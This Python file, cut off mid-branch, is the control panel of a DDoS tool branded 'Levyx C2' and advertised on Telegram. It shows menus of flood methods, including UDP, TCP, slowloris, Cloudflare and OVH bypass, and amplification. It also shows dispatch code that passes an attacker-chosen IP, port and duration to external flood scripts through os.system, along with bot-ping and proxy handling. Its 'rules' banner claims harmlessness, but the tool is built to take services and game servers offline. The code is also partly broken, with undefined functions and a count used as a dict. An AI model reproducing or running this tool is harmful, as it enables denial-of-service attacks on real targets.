# copyright © by levyx power full ddos api/botnet

import undetected_chromedriver as webdriver
import socket
import os
import requests
import random
import getpass
import time
import sys
import socket, threading, time, random, cloudscraper, requests
import socket, threading, time, ipaddress, random, json
from colorama import Fore, init

#comands#
from url_to_ip import url_to_ip
from ip_to_loc import ip_to_loc

#cnc port#
C2_ADDRESS  = "127.0.0.1"
C2_PORT     = 6667

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
#bot#
bot = open('bot.py')
#proxies
proxys = open('proxies.txt').readlines()
bots = len(proxys)

def color(data_input_output):
    random_output = data_input_output
    if random_output == "GREEN":
        data = '\033[32m'
    elif random_output == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random_output == "YELLOW":
        data = '\033[33m'
    elif random_output == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random_output == "CYAN":
        data = '\033[36m'
    elif random_output == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random_output == "BLUE":
        data = '\033[34m'
    elif random_output == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random_output == "MAGENTA":
        data = '\033[35m'
    elif random_output == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random_output == "RED":
        data = '\033[31m'
    elif random_output == "LIGHTRED_EX":
        data = '\033[91m'
    elif random_output == "BLACK":
        data = '\033[30m'
    elif random_output == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random_output == "WHITE":
        data = '\033[37m'
    elif random_output == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data
    
def ping():
    while 1:
        dead_bots = []
        for bot in bots.copy().keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)    



def si():
    print('\u001B[35mWelcome To :\x1b[38;2;0;2555m Levyx C2 | TELEGRAM : [t.me/levyxc2 | [@Levyxnet] ')
    print("")

def tools():
    clear()
    si()
    print(f'''
    
\u001B[35m                          ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\u001B[35m                          ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\u001B[35m                          ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
\u001B[35m                          ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\u001B[35m                          .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\u001B[35m                           • • • • • • • • • • • • • •
\u001B[35m                   ╚═══╦═════════════════════════════════╦═══╝
                                \u001B[35m╔═══════════════╗
                                \u001B[35m║     \x1b[38;2;0;255;255mTools     \u001B[35m║
                \u001B[35m╔═══════════════╩══════╦════════╩═══════════════╗
                \u001B[35m║  \x1b[38;2;0;2555mgeoip               \u001B[35m║  \x1b[38;2;0;2555mreverse-dns           \u001B[35m║
                \u001B[35m║  \x1b[38;2;0;2555mreverseip           \u001B[35m║  \x1b[38;2;0;2555m<empty>               \u001B[35m║  
                \u001B[35m║  \x1b[38;2;0;2555msubnet-lookup       \u001B[35m║  \x1b[38;2;0;2555m<empty>               \u001B[35m║
                \u001B[35m║  \x1b[38;2;0;2555masn-lookup          \u001B[35m║  \x1b[38;2;0;2555m<empty>               \u001B[35m║
                \u001B[35m║  \x1b[38;2;0;2555mdns-lookup          \u001B[35m║  \x1b[38;2;0;2555m<empty>               \u001B[35m║
                \u001B[35m╚══════════════════════╩════════════════════════╝
                  ▀▄▀▄▀▄𝙻𝙴𝚅𝚈𝚇 𝙲2 𝙳𝙳𝙾𝚂 𝙿𝙰𝙽𝙴𝙻 𝙾𝚆𝙽𝙴𝚁 𝙻𝙴𝚅𝚈𝚇𝙽𝙴𝚃▄▀▄▀▄▀        
                   
''')
    
def banners():
    clear()
    si()
    print(f'''
    
\u001B[35m                          ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\u001B[35m                          ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\u001B[35m                          ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
\u001B[35m                          ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\u001B[35m                          .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\u001B[35m                           • • • • • • • • • • • • • •
\u001B[35m                   ╚═══╦═════════════════════════════════╦═══╝
                                \u001B[35m╔═══════════════╗
                                \u001B[35m║   \x1b[;2;0;55;25mBanners.    \u001B[35m║
                \u001B[35m╔═══════════════╩══════╦════════╩═══════════════╗
                \u001B[35m║  \x1b[38;2;0;2555mtroll               \u001B[35m║  \x1b[38;2;0;2555m<empty>               \u001B[35m║
                \u001B[35m║  \x1b[38;2;0;2555mpikachu             \u001B[35m║  \x1b[38;2;0;2555m<empty>               \u001B[35m║  
                \u001B[35m║  \x1b[38;2;0;2555m<empty>             \u001B[35m║  \x1b[38;2;0;2555m<empty>               \u001B[35m║
                \u001B[35m║  \x1b[38;2;0;2555m<empty>             \u001B[35m║  \x1b[38;2;0;2555m<empty>               \u001B[35m║
                \u001B[35m║  \x1b[38;2;0;2555m<empty>             \u001B[35m║  \x1b[38;2;0;2555m<empty>               \u001B[35m║
                \u001B[35m╚══════════════════════╩════════════════════════╝
                 ▀▄▀▄▀▄ 𝙻𝙴𝚅𝚈𝚇 𝙲2 𝙳𝙳𝙾𝚂 𝙿𝙰𝙽𝙴𝙻 𝙾𝚆𝙽𝙴𝚁 𝙻𝙴𝚅𝚈𝚇𝙽𝙴𝚃▄▀▄▀▄▀         
''')

def rules():
    clear()
    si()
    print(f'''
    
\u001B[35m                          ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\u001B[35m                          ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\u001B[35m                          ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
\u001B[35m                          ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\u001B[35m                          .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\u001B[35m                           • • • • • • • • • • • • • •
\u001B[35m                   ╚═══╦═════════════════════════════════╦═══╝
                                \u001B[35m╔═══════════════╗
                                \u001B[35m║     \x1b[38;2;0;2555mRules     \u001B[35m║
                \u001B[35m╔═══════════════╩═══════════════╩═══════════════╗
                \u001B[35m║ \x1b[38;2;0;2555m2. Do not attack .gov/.gob/.edu/.mil domains  \u001B[35m║
                \u001B[35m║ \x1b[38;2;0;2555m4. Only attack stress testing servers         \u001B[35m║
                \u001B[35m║ \x1b[38;2;0;2555m5. Don't skid the panel                       \u001B[35m║
                \u001B[35m║ \x1b[38;2;0;2555m6. Give a star to the github repository       \u001B[35m║
                \u001B[35m║ \x1b[38;2;0;2555m7. The creator does not do any harm           \u001B[35m║
                \u001B[35m╚═══════════════════════════════════════════════╝
                  ▀▄▀▄▀▄𝙻𝙴𝚅𝚈𝚇 𝙲2 𝙳𝙳𝙾𝚂 𝙿𝙰𝙽𝙴𝙻 𝙾𝚆𝙽𝙴𝚁 𝙻𝙴𝚅𝚈𝚇𝙽𝙴𝚃▄▀▄▀▄▀        
''')

def ports():
    clear()
    si()
    print(f'''
    
\u001B[35m                          ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\u001B[35m                          ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\u001B[35m                          ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
\u001B[35m                          ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\u001B[35m                          .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\u001B[35m                           • • • • • • • • • • • • • •
\u001B[35m                   ╚═══╦═════════════════════════════════╦═══╝
                                \u001B[35m╔═══════════════╗
                                \u001B[35m║     \x1b[38;2;0;2555mPorts     \u001B[35m║
                \u001B[35m╔═══════════════╩═══════════════╩═══════════════╗
                \u001B[35m║ \x1b[38;2;0;212;14m21 - \x1b[38;2;0;255;255mSFTP       \x1b[38;2;0;212;14m69   - \x1b[38;2;0;255;255mTFTP      \x1b[38;2;0;212;14m5060  - \x1b[38;2;0;255;255mRIP  \u001B[35m║
                \u001B[35m║ \x1b[38;2;0;212;14m22 - \x1b[38;2;0;255;255mSSH        \x1b[38;2;0;212;14m80   - \x1b[38;2;0;255;255mHTTP      \x1b[38;2;0;212;14m30120 - \x1b[38;2;0;255;255mFIVEM\u001B[35m║
                \u001B[35m║ \x1b[38;2;0;212;14m23 - \x1b[38;2;0;255;255mTELNET     \x1b[38;2;0;212;14m443  - \x1b[38;2;0;255;255mHTTPS                  \u001B[35m║   
                \u001B[35m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mSMTP       \x1b[38;2;0;212;14m3074 - \x1b[38;2;0;255;255mXBOX                   \u001B[35m║
                \u001B[35m║ \x1b[38;2;0;212;14m53 - \x1b[38;2;0;255;255mDNS        \x1b[38;2;0;212;14m5060 - \x1b[38;2;0;255;255mPLAYSATION             \u001B[35m║
                \u001B[35m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mMINECRAFT       \x1b[38;2;0;212;14m25565 - \x1b[38;2;0;255;255mMINECRAFT        \u001B[35m║
                \u001B[35m╚═══════════════════════════════════════════════╝
                 ▀▄▀▄▀▄𝙻𝙴𝚅𝚈𝚇 𝙲2 𝙳𝙳𝙾𝚂 𝙿𝙰𝙽𝙴𝙻 𝙾𝚆𝙽𝙴𝚁 𝙻𝙴𝚅𝚈𝚇𝙽𝙴𝚃▄▀▄▀▄▀        
''')

def special():
    clear()
    si()
    print(f'''
    
\u001B[35m                          ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\u001B[35m                          ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\u001B[35m                          ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
\u001B[35m                          ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\u001B[35m                          .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\u001B[35m                           • • • • • • • • • • • • • •
\u001B[35m                   ╚═══╦═════════════════════════════════╦═══╝
                                \u001B[35m╔═══════════════╗
                                \u001B[35m║    \x1b[38;2;0;2555mSpecial    \u001B[35m║
                \u001B[35m╔═══════════════╩══════╦════════╩═══════════════╗
                \u001B[35m║  \x1b[38;2;0;255;255mstress              \u001B[35m║  \x1b[38;2;0;255;255m<empty>               \u001B[35m║
                \u001B[35m║  \x1b[38;2;0;255;255m<empty>             \u001B[35m║  \x1b[38;2;0;255;255m<empty>               \u001B[35m║  
                \u001B[35m║  \x1b[38;2;0;255;255m<empty>             \u001B[35m║  \x1b[38;2;0;255;255m<empty>               \u001B[35m║
                \u001B[35m║  \x1b[38;2;0;255;255m<empty>             \u001B[35m║  \x1b[38;2;0;255;255m<empty>               \u001B[35m║
                \u001B[35m║  \x1b[38;2;0;255;255m<empty>             \u001B[35m║  \x1b[38;2;0;255;255m<empty>               \u001B[35m║
                \u001B[35m╚══════════════════════╩════════════════════════╝
                 ▀▄▀▄▀▄𝙻𝙴𝚅𝚈𝚇 𝙲2 𝙳𝙳𝙾𝚂 𝙿𝙰𝙽𝙴𝙻 𝙾𝚆𝙽𝙴𝚁 𝙻𝙴𝚅𝚈𝚇𝙽𝙴𝚃▄▀▄▀▄▀         
''')
    
def layer7():
    clear()
    si()
    print(f'''
    
\u001B[35m                          ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\u001B[35m                          ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\u001B[35m                          ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
\u001B[35m                          ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\u001B[35m                          .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\u001B[35m                           • • • • • • • • • • • • • •
\u001B[35m                   ╚═══╦═════════════════════════════════╦═══╝
                              \u001B[35m╔═══════════════╗
                              \u001B[35m║    \x1b[38;2;0;255;255mLayer 7    \u001B[35m║
               \u001B[35m╔══════════════╩════════╦══════╩══════════════╗
               \u001B[35m║   \x1b[38;2;0;255;255mhttp-raw            \u001B[35m║   \x1b[38;2;0;255;255mcrash             \u001B[35m║
               \u001B[35m║   \x1b[38;2;0;255;255mhttp-socket         \u001B[35m║   \x1b[38;2;0;255;255mhttpflood         \u001B[35m║
               \u001B[35m║   \x1b[38;2;0;255;255mhttp-fuzz           \u001B[35m║   \x1b[38;2;0;255;255mcf-socket         \u001B[35m║
               \u001B[35m║   \x1b[38;2;0;255;255mhttp-rand           \u001B[35m║   \x1b[38;2;0;255;255mcf-pro            \u001B[35m║
               \u001B[35m║   \x1b[38;2;0;255;255moverflow            \u001B[35m║   \x1b[38;2;0;255;255mhyper             \u001B[35m║
               \u001B[35m║   \x1b[38;2;0;255;255mcf-bypass           \u001B[35m║   \x1b[38;2;0;255;255mslow              \u001B[35m║
               \u001B[35m║   \x1b[38;2;0;255;255muambypass           \u001B[35m║   \x1b[38;2;0;255;255mhttps-spoof       \u001B[35m║
               \u001B[35m║   \x1b[38;2;0;255;255movh-raw             \u001B[35m║   \x1b[38;2;0;255;255movh-beam          \u001B[35m║
               \u001B[35m╚═══════════════════════╩═════════════════════╝
                ▀▄▀▄▀▄𝙻𝙴𝚅𝚈𝚇 𝙲2 𝙳𝙳𝙾𝚂 𝙿𝙰𝙽𝙴𝙻 𝙾𝚆𝙽𝙴𝚁 𝙻𝙴𝚅𝚈𝚇𝙽𝙴𝚃▄▀▄▀▄▀        
''')

def layer4():
    clear()
    si()
    print(f'''
    
\u001B[35m                          ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\u001B[35m                          ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\u001B[35m                          ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
\u001B[35m                          ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\u001B[35m                          .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\u001B[35m                           • • • • • • • • • • • • • •
\u001B[35m                   ╚═══╦═════════════════════════════════╦═══╝
                              \u001B[35m╔═══════════════╗
                              \u001B[35m║    \x1b[38;2;0;255;255mLayer 4    \u001B[35m║
               \u001B[35m╔══════════════╩════════╦══════╩══════════════╗
               \u001B[35m║   \x1b[38;2;0;255;255mudp                 \u001B[35m║   \x1b[38;2;0;255;255mtcp               \u001B[35m║
               \u001B[35m║   \x1b[38;2;0;255;255mnfo-killer          \u001B[35m║   \x1b[38;2;0;255;255mstd               \u001B[35m║
               \u001B[35m║   \x1b[38;2;0;255;255mudpbypass           \u001B[35m║   \x1b[38;2;0;255;255mdestroy           \u001B[35m║
               \u001B[35m║   \x1b[38;2;0;255;255mhome                \u001B[35m║   \x1b[38;2;0;255;255mgod               \u001B[35m║
               \u001B[35m║   \x1b[38;2;0;255;255mslowloris           \u001B[35m║   \x1b[38;2;0;255;255mflux              \u001B[35m║
               \u001B[35m║   \x1b[38;2;0;255;255mstdv2               \u001B[35m║   \x1b[38;2;0;255;255m<empty>           \u001B[35m║
               \u001B[35m╚═══════════════════════╩═════════════════════╝
                ▀▄▀▄▀▄𝙻𝙴𝚅𝚈𝚇 𝙲2 𝙳𝙳𝙾𝚂 𝙿𝙰𝙽𝙴𝙻 𝙾𝚆𝙽𝙴𝚁 𝙻𝙴𝚅𝚈𝚇𝙽𝙴𝚃▄▀▄▀▄▀        
''')

def amp_games():
    clear()
    si()
    print(f'''
\u001B[35m                          ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\u001B[35m                          ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\u001B[35m                          ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
\u001B[35m                          ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\u001B[35m                          .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\u001B[35m                           • • • • • • • • • • • • • •
\u001B[35m                   ╚═══╦═════════════════════════════════╦═══╝
                              \u001B[35m╔═══════════════╗
                              \u001B[35m║\x1b[38;2;0;255;255m AMP's \x1b[38;2;0;212;14m/ \x1b[38;2;0;255;255mGames \u001B[35m║
               \u001B[35m╔══════════════╩════════╦══════╩══════════════╗
               \u001B[35m║   \x1b[38;2;0;255;255movh-amp             \u001B[35m║   \x1b[38;2;0;255;255movh-amp           \u001B[35m║
               \u001B[35m║   \x1b[38;2;0;255;255mminecraft           \u001B[35m║   \x1b[38;2;0;255;255mstd               \u001B[35m║
               \u001B[35m║   \x1b[38;2;0;255;255msamp                \u001B[35m║   \x1b[38;2;0;255;255mldap              \u001B[35m║
               \u001B[35m║   \x1b[38;2;0;255;255m<empty>             \u001B[35m║   \x1b[38;2;0;255;255m<empty>           \u001B[35m║
               \u001B[35m╚═══════════════════════╩═════════════════════╝
                ▀▄▀▄▀▄𝙻𝙴𝚅𝚈𝚇 𝙲2 𝙳𝙳𝙾𝚂 𝙿𝙰𝙽𝙴𝙻 𝙾𝚆𝙽𝙴𝚁 𝙻𝙴𝚅𝚈𝚇𝙽𝙴𝚃▄▀▄▀▄▀
"''')

def VIP():
    clear()
    si()
    print(f'''
\u001B[35m                         ╦  ╔═╗╦ \u001B[31m ╦╦ ╦═╗ ╦
\u001B[35m                         ║  ║╣ ╚╗\u001B[31m╔╝╚╦╝╔╩╦╝
\u001B[35m                         ╩═╝╚═╝ ╚\u001B[31m╝  ╩ ╩ ╚═      
\u001B[35m             ═════════════╦══════\u001B[31m═══════╦═══════════════       
\u001B[35m  ╔═══════════════════════╩══════\u001B[31m═══════╩════════════════════════╗
\u001B[35m  ║      \x1b[38;2;0;255;255m             SPECIAL BASIC EXCLUSIVE                   \u001B[31m ║
\u001B[35m  ╚═══╦════╦══════╦══════╦═══════\u001B[31m═══════╦═══════╦═══════╦════╦═══╝
\u001B[35m  ╔═══╩════╩══════╩╦═════╩═══════\u001B[31m═══════╩══════╦╩═══════╩════╩═══╗
\u001B[35m  ║ \x1b[38;2;0;49;147m ●\x1b[38;2;0;255;255m  \x1b[38;2;0;255;255mBROWSER-VIP\u001B[35m║   ●\x1b[38;2;0;212;14m ONLINE \u001B[31m- - - - -     \u001B[31m ║   ● \x1b[38;2;0;255;255m LEVYX-VIP  \u001B[31m║
\u001B[35m  ║\x1b[38;2;0;49;147m  ●\x1b[38;2;0;255;255m \x1b[38;2;0;255;255m TLS     \u001B[35m   ║   ●\x1b[38;2;0;212;14m ONLINE\u001B[31m - - - - -    \u001B[31m  ║   ●  \x1b[38;2;0;255;255mSOCKET-VIP \u001B[31m║
\u001B[35m  ║\x1b[38;2;0;49;147m  ● \x1b[38;2;0;255;255m\x1b[38;2;0;255;255m TLS-VIP \u001B[35m   ║   ● \x1b[38;2;0;212;14mONLINE\u001B[31m - - - - -    \u001B[31m  ║   ● \x1b[38;2;0;255;255m CRASH-VIP \u001B[31m ║
\u001B[35m  ║ \x1b[38;2;0;49;147m ● \x1b[38;2;0;255;255m \x1b[38;2;0;255;255mKILL-VIP  \u001B[35m ║   ●\x1b[38;2;0;212;14m ONLINE\u001B[31m - - - - -   \u001B[31m   ║   ● \x1b[38;2;0;255;255m HTTP-VIP  \u001B[31m ║
\u001B[35m  ║ \x1b[38;2;0;49;147m ●\x1b[38;2;0;255;255m \x1b[38;2;0;255;255m SSH-VIP   \u001B[35m ║   ● \x1b[38;2;0;212;14mONLINE\u001B[31m - - - - -    \u001B[31m  ║   ● \x1b[38;2;0;255;255m HTTPS-VIP  \u001B[31m║
\u001B[35m  ╚═══════╦═══════╦╩══════╦══════\u001B[31m═══════╦══════╩╦═════════╦══════╝
\u001B[35m  ╔═══════╩═══════╩═══════╩══════\u001B[31m═══════╩═══════╩═════════╩══════╗
\u001B[35m  ║       \x1b[38;2;0;255;255m How To Attack [\u001B[31mMETHOD\x1b[38;2;0;255;255m] [\u001B[31mTARGET\x1b[38;2;0;255;255m] [\u001B[31mGET\x1b[38;2;0;255;255m] [\u001B[31mPORT\x1b[38;2;0;255;255m]         \u001B[31m ║
\u001B[35m  ╚══════════════════════════════\u001B[31m════════════════════════════════╝

"''')


def menu():
    sys.stdout.write(f"\x1b]2;Levyx C2 --> Stars: [{bots}] | Online Users: [1] |Expired [72766627282] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print('\u001B[35mWelcome To :\x1b[38;2;0;2555m Levyx C2 | TELEGRAM : [t.me/levyxc2 | [@Levyxnet] ')
    print("")
    print("""
        
\u001B[35m                         ╦  ╔═╗╦  ╦╦ ╦═╗ ╦
\u001B[35m                         ║  ║╣ ╚╗╔╝╚╦╝╔╩╦╝
\u001B[35m                         ╩═╝╚═╝ ╚╝  ╩ ╩ ╚═          
             ═════════════╦══════\u001B[31m═══════╦═══════════════               
\u001B[35m      ╔═══════════════════╩══════\u001B[31m═══════╩════════════════════╗
\u001B[35m      ║     \x1b[38;2;0;255;255m   Welcome To The Home Screen Of Levyx C2     \u001B[31m   ║
\u001B[35m      ║     \x1b[38;2;0;255;255m             Power Full L4 & L7             \u001B[31m     ║
\u001B[35m      ║    \x1b[38;2;0;255;255m  Copyright © 2023 Levyx All Rights Reserved  \u001B[31m    ║
\u001B[35m      ╚═════════════╦════════════\u001B[31m═══════════════╦════════════╝
\u001B[35m            ╔═══════╩═════════════\u001B[31m══════════════╩═══════╗
\u001B[35m            ║\x1b[38;2;0;255;255m - - - - - Type \u001B[31mhelp\x1b[38;2;0;255;255m to out menu - - - - - \u001B[31m║
\u001B[35m            ╚═══╦═════════════════\u001B[31m╦═════════════════╦═══╝
\u001B[35m         ╔══════╩═════════════════\u001B[31m╩═════════════════╩══════╗     
\u001B[35m         ║\x1b[38;2;0;255;255m - - - - -TELEGRAM https://t.me/levyxc2- - - - - \u001B[31m║
\u001B[35m         ╚════════════════════════\u001B[31m═════════════════════════╝
   
""")



def main():
    menu()
    while(True):
        cnc = input('''\u001B[31m╔══\x1b[38;2;0;255m[Levyx\x1b[38;2;0;255m@\x1b[38;2;0;255mRoot\x1b[38;2;0;255m]
\x1b[38;2;0;255m╚\x1b[38;2;0;255m═\x1b[38;2;0;255m═\x1b[38;2;0;255m═\x1b[38;2;0;255m═\x1b[38;2;0;255m➤ \u001B[31m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "ongoing" or cnc == "ongoing" or cnc == "L4" or cnc == "l4":
            ongoing()    
        elif cnc == "fake" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            fake()    
        elif cnc == "VIP" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            VIP()    
        elif cnc == "VipMethod" or cnc == "VipMethod" or cnc == "VipMethod" or cnc == "VipMethod":
            VipMethod()    
        elif cnc == "help" or cnc == "help" or cnc == "L4" or cnc == "l4":
            help()     
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            special()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            banners()

# LAYER 4 METHODS   

        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python UDP-BYPASS {ip} {port}')
            except IndexError:
                print('Usage: udpbypass <ip> <port>')
                print('Example: udpbypass 1.1.1.1 80')

        elif "stdv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python std {ip} {port}')
            except IndexError:
                print('Usage: stdv2 <ip> <port>')
                print('Example: stdv2 1.1.1.1 80')

        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python flux {ip} {port} {thread} 0')
            except IndexError:
                print('Usage: flux <ip> <port> <threads>')
                print('Example: flux 1.1.1.1 80 250')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python slowloris {ip} {port}')
            except IndexError:
                print('Usage: slowloris <ip> <port>')
                print('Example: slowloris 1.1.1.1 80')

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('Usage: std <ip> <port>')
                print('Example: std 1.1.1.1 80')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'python nfo-killer {ip} {port} {threads} -1 {time}')
            except IndexError:
                print('Usage: nfo-killer <ip> <port> <threads> <time>')
                print('Example: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'python ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'python 100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')

# SPECIAL METHODS

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
# AMP/GAMES METHODS

        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 samp.py {ip} {port}')
            except IndexError:
